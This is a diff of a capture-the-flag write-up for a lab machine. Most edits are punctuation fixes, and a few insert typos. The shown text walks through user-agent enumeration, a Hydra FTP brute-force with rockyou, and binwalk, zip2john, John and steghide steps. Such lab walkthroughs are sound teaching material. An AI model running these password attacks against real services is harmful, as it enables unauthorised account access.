@@ -63,7 +63,7 @@ Agent R
 </body>
 </html> 
 ```
-This has yielded a different page than before! The fact Agent R says "Are you one of the 25 employees?" makes me think the agents are named alphabetically, e.g. Agent A, Agent B, Agent C, etc. We can attempt to change the user-agent to different characters of the alphabet, however, I am going to use a bash script to automate this:
+This has yielded a different page than before! The fact Agent R says, "Are you one of the 25 employees?" makes me think the agents are named alphabetically, e.g. Agent A, Agent B, Agent C, etc. We can attempt to change the user-agent to different characters of the alphabet. However, I am going to use a bash script to automate this:
 ```
 #!/bin/bash
 for letter in {A..Z}; do
@@ -78,7 +78,7 @@ From,<br>
 Agent R
 ```
 #FTP Password Cracking
-We now know that there is a user named: Chris and that his password is weak. We can try to brute-force the ftp login with the username "chris". To do this I will be using Hydra Password Cracker
+We now know that there is a user named Chris, and his password is weak. We can try to brute-force the ftp login with the username "chris". To do this, I will be using Hydra Password Cracke.r
 ```
 └─$ hydra -l chris -P WordLists/rockyou.txt 10.10.83.69 ftp
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -106,7 +106,7 @@ From,
 Agent C
 ```
 ## Image Forensics
-This tells us that there is a password stored inside the image, to retrieve this we can use the Binwalk tool to extract hidden data within images
+This tells us that there is a password stored inside the image. To retrieve this, we can use the Binwalk tool to extract hidden data within image.s
 ```
 └─$ binwalk cute-alien.jpg
 /usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
@@ -127,11 +127,11 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
 34820         0x8804          End of Zip archive, footer length: 22
 ```
-Ah, we have found the embedded image. We can extract this with the -e flag
+Ah, we have found the embedded image. We can extract this with the -e flag.
 ```
 └─$ binwalk -e cutie.png
 ```
-Now we can change our directory to our extracted file and view the hidden content
+Now, we can change our directory to our extracted file and view the hidden content.
 ```
 └─$ cd _cutie.png.extracted/; ls -la
 total 324
@@ -145,11 +145,11 @@ drwxr-xr-x 3 ben ben   4096 Jan  7 18:09 ..
 └─$ file 8702.zip
 8702.zip: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
 ```
-We have a zlip file, however it is password protected. We can use John to try to crack the hash for the file. Firstly we will convert the zip file into a hash which can then be loaded into john for cracking:
+We have a zlip file, however it is password protected. We can use John to try to crack the hash for the file. Firstly, we will convert the zip file into a has,h which can then be loaded into John for cracking:
 ```
 └─$ zip2john 8702.zip > zippedzip.txt
 ```
-Then we can now use John to crack the hash. This may require sudo privileges and will use up a significant amount of processing power.
+Then we can now use John to crack the hash. This may require sudo privileges and will use a significant amount of processing power.
 ```
 └─$ sudo john --format=zip zippedzip.txt
 [sudo] password for ben:
@@ -180,7 +180,7 @@ Everything is Ok
 Size:       86
 Compressed: 280 
 ```
-We can now access the file content. Accessing this we find a "To_agentR.txt" file.
+We can now access the file content. Accessing this, we find a "To_agentR.txt" file.
 ```
 └─$ cat To_agentR.txt
 Agent C,
@@ -193,7 +193,7 @@ This looks like a base64 ciphertext, we can decode this using base64 -d
 └─$ echo "QXJlYTUx" | base64 -d
 Area51
 ```
-Area51 is our password. We can now look into the alien picture using steghide.
+Area51 is our password. We can now look at the alien picture using Steghide.
 ```
 └─$ steghide extract -sf cute-alien.jpg
 Enter passphrase:
